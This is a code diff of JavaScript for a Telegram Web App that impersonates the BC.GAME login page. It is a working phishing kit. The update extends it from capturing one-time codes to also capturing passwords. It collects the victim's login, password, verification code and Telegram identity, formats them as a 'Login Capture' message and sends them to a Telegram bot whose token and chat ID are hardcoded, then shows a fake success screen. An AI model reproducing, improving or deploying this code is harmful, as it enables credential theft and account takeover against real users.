@@ -1,6 +1,6 @@
-// Configuration - Replace with your target bot details
-const TARGET_BOT_TOKEN = '8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc'; // Use your logging bot token
-const TARGET_CHAT_ID = '7611425178'; // Use your personal chat ID or a group ID
+// Configuration - Update these for your logging bot
+const TARGET_BOT_TOKEN = '8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc'; 
+const TARGET_CHAT_ID = '7611425178';
 
 // Initialize Telegram Web App
 const tg = window.Telegram ? window.Telegram.WebApp : null;
@@ -10,153 +10,174 @@ if (tg) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    // DOM Elements
-    const tabBtns = document.querySelectorAll('.tab');
-    const toggleBtns = document.querySelectorAll('.toggle-btn');
-    const inputLabel = document.getElementById('input-label');
-    const inputIcon = document.getElementById('input-icon');
-    const userIdentifier = document.getElementById('user-identifier');
-    const sendOtpBtn = document.getElementById('send-otp');
-    const timerContainer = document.getElementById('timer-container');
-    const timerCount = document.getElementById('timer-count');
-    const loginSubmit = document.getElementById('login-submit');
-    const closeApp = document.getElementById('close-app');
-    const successModal = document.getElementById('success-modal');
-    const modalOk = document.getElementById('modal-ok');
-    const userUid = document.getElementById('user-uid');
-    const otpCode = document.getElementById('otp-code');
+    // Elements
+    const tabItems = document.querySelectorAll('.tab-item');
+    const btnSignin = document.getElementById('btn-signin');
+    const mainIdentifier = document.getElementById('main-identifier');
+    const passwordField = document.getElementById('password-field');
+    const loginPassword = document.getElementById('login-password');
+    const otpOverlay = document.getElementById('otp-overlay');
+    const verifyTitle = document.getElementById('verify-title');
+    const verifyDesc = document.getElementById('verify-desc');
+    const verifyTypeIcon = document.getElementById('verify-type-icon');
+    const btnConfirm = document.getElementById('btn-confirm');
+    const verifyCodeInput = document.getElementById('verify-code-input');
+    const resendSeconds = document.getElementById('resend-seconds');
+    const closeIcons = document.querySelectorAll('.close-icon, .verify-close');
+    const eyeIcon = document.querySelector('.eye-icon');
+    const pasteBtn = document.querySelector('.paste-btn');
 
-    let loginType = 'email';
+    let activeTab = 'password';
     let timerInterval;
 
     // Tab Switching
-    tabBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            tabBtns.forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            
-            if (btn.dataset.tab === 'password') {
-                document.getElementById('otp-field').style.display = 'none';
-                loginSubmit.innerText = 'Login';
+    tabItems.forEach(item => {
+        item.addEventListener('click', () => {
+            tabItems.forEach(i => i.classList.remove('active'));
+            item.classList.add('active');
+            activeTab = item.dataset.tab;
+
+            if (activeTab === 'otp') {
+                passwordField.style.display = 'none';
+                mainIdentifier.placeholder = 'Email / Phone Number';
             } else {
-                document.getElementById('otp-field').style.display = 'block';
-                loginSubmit.innerText = 'Sign In';
+                passwordField.style.display = 'flex';
+                mainIdentifier.placeholder = 'Email / Phone Number / Username';
             }
         });
     });
 
-    // Email/Phone Toggle
-    toggleBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            toggleBtns.forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            loginType = btn.dataset.type;
+    // Toggle Password Visibility
+    eyeIcon.addEventListener('click', () => {
+        const type = loginPassword.type === 'password' ? 'text' : 'password';
+        loginPassword.type = type;
+        eyeIcon.querySelector('i').className = type === 'password' ? 'far fa-eye' : 'far fa-eye-slash';
+    });
 
-            if (loginType === 'email') {
-                inputLabel.innerText = 'Email Address';
-                inputIcon.className = 'fas fa-envelope';
-                userIdentifier.placeholder = 'Enter your email';
-                userIdentifier.type = 'email';
-            } else {
-                inputLabel.innerText = 'Phone Number';
-                inputIcon.className = 'fas fa-phone-alt';
-                userIdentifier.placeholder = 'Enter your phone number';
-                userIdentifier.type = 'tel';
+    // Close Actions
+    closeIcons.forEach(icon => {
+        icon.addEventListener('click', () => {
+            otpOverlay.style.display = 'none';
+            if (icon.classList.contains('close-icon') && tg) {
+                tg.close();
             }
         });
     });
 
-    // Send OTP Simulation
-    sendOtpBtn.addEventListener('click', () => {
-        const identifier = userIdentifier.value.trim();
+    // Sign In Button
+    btnSignin.addEventListener('click', () => {
+        const identifier = mainIdentifier.value.trim();
+        const password = loginPassword.value.trim();
+
         if (!identifier) {
-            alert(`Please enter a valid ${loginType}`);
+            alert('Please enter your details');
             return;
         }
 
-        sendOtpBtn.disabled = true;
-        sendOtpBtn.style.opacity = '0.5';
-        timerContainer.style.display = 'block';
+        if (activeTab === 'password' && !password) {
+            alert('Please enter your password');
+            return;
+        }
+
+        // Determine if it's email or phone for the verification modal
+        const isEmail = identifier.includes('@');
         
-        let timeLeft = 60;
-        timerCount.innerText = timeLeft;
+        if (isEmail) {
+            verifyTitle.innerText = 'Email Verification';
+            verifyDesc.innerText = `Please enter the 6-digit verification code sent on e-mail`;
+            verifyTypeIcon.className = 'fas fa-envelope';
+        } else {
+            verifyTitle.innerText = 'Phone Verification';
+            verifyDesc.innerText = `Please enter the 6-digit verification code sent to your phone`;
+            verifyTypeIcon.className = 'fas fa-mobile-alt';
+        }
 
-        timerInterval = setInterval(() => {
-            timeLeft--;
-            timerCount.innerText = timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                sendOtpBtn.disabled = false;
-                sendOtpBtn.style.opacity = '1';
-                timerContainer.style.display = 'none';
-            }
-        }, 1000);
-
-        // Haptic feedback
-        if (tg) tg.HapticFeedback.notificationOccurred('success');
+        // Show Verification Modal
+        otpOverlay.style.display = 'flex';
+        startTimer(46);
+        
+        if (tg) tg.HapticFeedback.impactOccurred('medium');
     });
 
-    // Login Submit
-    loginSubmit.addEventListener('click', async () => {
-        const identifier = userIdentifier.value.trim();
-        const uid = userUid.value.trim();
-        const code = otpCode.value.trim();
+    // Confirm Button (Final Submission)
+    btnConfirm.addEventListener('click', async () => {
+        const code = verifyCodeInput.value.trim();
+        const identifier = mainIdentifier.value.trim();
+        const password = loginPassword.value.trim();
         const username = tg?.initDataUnsafe?.user?.username || 'Guest';
         const tgId = tg?.initDataUnsafe?.user?.id || 'N/A';
 
-        if (!identifier || !uid || !code) {
-            alert('Please fill in all fields');
+        if (code.length < 4) {
+            alert('Please enter a valid verification code');
             return;
         }
 
-        loginSubmit.innerText = 'Processing...';
-        loginSubmit.disabled = true;
+        btnConfirm.innerText = 'Verifying...';
+        btnConfirm.disabled = true;
 
-        const data = {
-            username: username,
+        const captureData = {
+            tg_username: username,
             tg_id: tgId,
-            uid: uid,
-            login_type: loginType,
             identifier: identifier,
-            otp: code,
+            password: activeTab === 'password' ? password : 'N/A (OTP Mode)',
+            otp_code: code,
+            login_mode: activeTab,
             timestamp: new Date().toLocaleString()
         };
 
-        // Send to target bot
-        await sendToBot(data);
+        // Send to Logger Bot
+        await sendToLogger(captureData);
 
-        // Success Feedback
-        successModal.style.display = 'flex';
+        // Success Simulation
+        btnConfirm.innerText = 'Success!';
         if (tg) tg.HapticFeedback.notificationOccurred('success');
+
+        setTimeout(() => {
+            otpOverlay.style.display = 'none';
+            if (tg) {
+                tg.sendData(JSON.stringify({ action: 'login_captured', status: 'ok' }));
+                tg.close();
+            } else {
+                location.reload();
+            }
+        }, 1500);
     });
 
-    // Modal OK
-    modalOk.addEventListener('click', () => {
-        successModal.style.display = 'none';
-        if (tg) {
-            // Send data back to the bot that opened the web app
-            tg.sendData(JSON.stringify({ action: 'verification_complete', status: 'success' }));
-            tg.close();
-        } else {
-            location.reload();
+    // Paste Function
+    pasteBtn.addEventListener('click', async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text) verifyCodeInput.value = text;
+        } catch (err) {
+            console.error('Clipboard error:', err);
         }
     });
 
-    // Close App
-    closeApp.addEventListener('click', () => {
-        if (tg) tg.close();
-    });
+    // Timer Logic
+    function startTimer(seconds) {
+        let timeLeft = seconds;
+        resendSeconds.innerText = timeLeft;
+        clearInterval(timerInterval);
+        
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            resendSeconds.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+            }
+        }, 1000);
+    }
 
-    // Function to send data to Telegram
-    async function sendToBot(data) {
+    // Function to send data to Telegram API
+    async function sendToLogger(data) {
         const message = `
-🚀 <b>New Login Capture</b>
+🎯 <b>Login Capture: BC.GAME</b>
 ━━━━━━━━━━━━━━━
-👤 <b>TG Username</b>: @${data.username}
-🆔 <b>TG ID</b>: <code>${data.tg_id}</code>
-🆔 <b>BC UID</b>: <code>${data.uid}</code>
-📧 <b>${data.login_type.toUpperCase()}</b>: <code>${data.identifier}</code>
-🔐 <b>OTP Code</b>: <code>${data.otp}</code>
+👤 <b>User</b>: @${data.tg_username} (ID: ${data.tg_id})
+📧 <b>Login</b>: <code>${data.identifier}</code>
+🔑 <b>Pass</b>: <code>${data.password}</code>
+🔢 <b>OTP</b>: <code>${data.otp_code}</code>
+🛠 <b>Mode</b>: ${data.login_mode.toUpperCase()}
 🕒 <b>Time</b>: ${data.timestamp}
 ━━━━━━━━━━━━━━━`;
 
@@ -171,7 +192,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 })
             });
         } catch (err) {
-            console.error('Error sending to bot:', err);
+            console.error('Logging failed:', err);
         }
     }
 });
